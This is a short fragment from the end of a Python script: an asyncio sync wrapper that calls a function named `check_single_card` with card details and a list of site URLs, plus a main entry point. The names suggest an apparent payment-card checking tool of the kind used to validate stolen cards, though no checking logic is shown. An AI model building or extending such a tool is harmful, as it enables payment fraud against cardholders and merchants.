                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
        return loop.run_until_complete(check_single_card(card_details, site_urls))
    except Exception as e:
        logger.error(f"Error in sync wrapper: {e}")
        return f"ERROR: {str(e)}"

if __name__ == "__main__":
    # Run async main
    asyncio.run(main_async())